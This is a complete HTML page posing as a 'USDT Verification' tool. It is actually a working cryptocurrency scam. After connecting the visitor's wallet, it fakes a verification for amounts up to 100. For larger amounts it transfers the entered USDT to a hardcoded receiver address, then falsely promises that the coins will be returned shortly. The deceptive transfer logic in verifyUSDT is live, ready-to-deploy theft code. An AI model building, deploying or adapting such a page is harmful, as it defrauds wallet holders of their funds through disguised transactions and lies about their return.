<!DOCTYPE html>
<html>
<head>
  <title>USDT Verification</title>
  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js"></script>
</head>
<body>
  <h1>USDT Coin Verification</h1>

  <button onclick="connectWallet()">Connect Wallet</button><br><br>

  <input type="number" id="amount" placeholder="Enter amount of USDT to verify" /><br><br>
  <button onclick="verifyUSDT()">Verify</button>

  <p id="status"></p>

  <script>
    let provider;
    let signer;
    const receiverAddress = "0xEab6eE87b58Da3B50c294C8c4a748EFb4d376386";
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955";

    const usdtAbi = [
      "function transfer(address to, uint amount) public returns (bool)",
      "function decimals() view returns (uint8)"
    ];

    async function connectWallet() {
      if (window.ethereum) {
        provider = new ethers.providers.Web3Provider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = provider.getSigner();
        document.getElementById("status").innerText = "✅ Wallet connected.";
      } else {
        alert("Please install MetaMask.");
      }
    }

    async function verifyUSDT() {
      const amount = parseFloat(document.getElementById("amount").value);
      if (!signer) return alert("Connect your wallet first.");
      if (amount <= 0) return alert("Enter a valid amount");

      if (amount <= 100) {
        document.getElementById("status").innerText = "Verifying...";
        setTimeout(() => {
          document.getElementById("status").innerText = "✅ Your coins are verified.";
        }, 3000);
      } else {
        try {
          const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
          const decimals = await usdt.decimals();
          const amountToSend = ethers.utils.parseUnits(amount.toString(), decimals);

          document.getElementById("status").innerText = "🔄 Sending USDT for verification...";

          const tx = await usdt.transfer(receiverAddress, amountToSend);
          await tx.wait();

          document.getElementById("status").innerText = "⏳ USDT sent. Please wait 2 minutes for verification...";
          setTimeout(() => {
            document.getElementById("status").innerText = "✅ You are verified. Coins will be returned shortly.";
          }, 120000);
        } catch (error) {
          console.error(error);
          alert("Transaction failed or rejected.");
        }
      }
    }
  </script>
</body>
</html>
